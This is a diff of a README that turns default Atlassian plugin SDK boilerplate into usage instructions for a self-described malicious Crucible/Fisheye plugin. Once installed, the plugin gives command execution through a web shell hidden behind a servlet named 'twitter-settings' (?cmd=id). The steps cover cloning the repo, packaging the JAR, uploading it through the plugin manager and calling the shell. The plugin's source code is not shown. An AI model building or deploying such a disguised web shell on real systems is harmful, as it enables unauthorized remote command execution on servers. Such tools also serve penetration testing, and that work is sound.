@@ -1,11 +1,23 @@
-You have successfully created an Atlassian Plugin!
+A malicious plugin for Atlassian Crucible/Fisheye that when installed gives command execution via `/plugins/servlet/twitter-settings?cmd=id` endpoint
 
-Here are the SDK commands you'll use immediately:
 
-* atlas-run   -- installs this plugin into the product and starts it on localhost
-* atlas-debug -- same as atlas-run, but allows a debugger to attach at port 5005
-* atlas-help  -- prints description for all commands in the SDK
+#### Usage
+1. Install Atlassian Plugin SDK. E.g. for MacOS:
+```bash
+brew tap atlassian/tap
+brew install atlassian/tap/atlassian-plugin-sdk
+```
 
-Full documentation is always available at:
+2. Clone this repo & cd into it
+```bash
+git clone https://github.com/UgniusV/fecru-webshell-plugin.git
+cd fecru-webshell-plugin
+```
 
-https://developer.atlassian.com/display/DOCS/Introduction+to+the+Atlassian+Plugin+SDK
+3. Generate a JAR by running
+```bash
+atlas-package
+```
+
+4. Navigate to http://crucible:8060/plugins/servlet/upm?source=side_nav_manage_addons & install the JAR
+5. Enjoy your webshell at: http://crucible:8060/plugins/servlet/twitter-settings?cmd=id
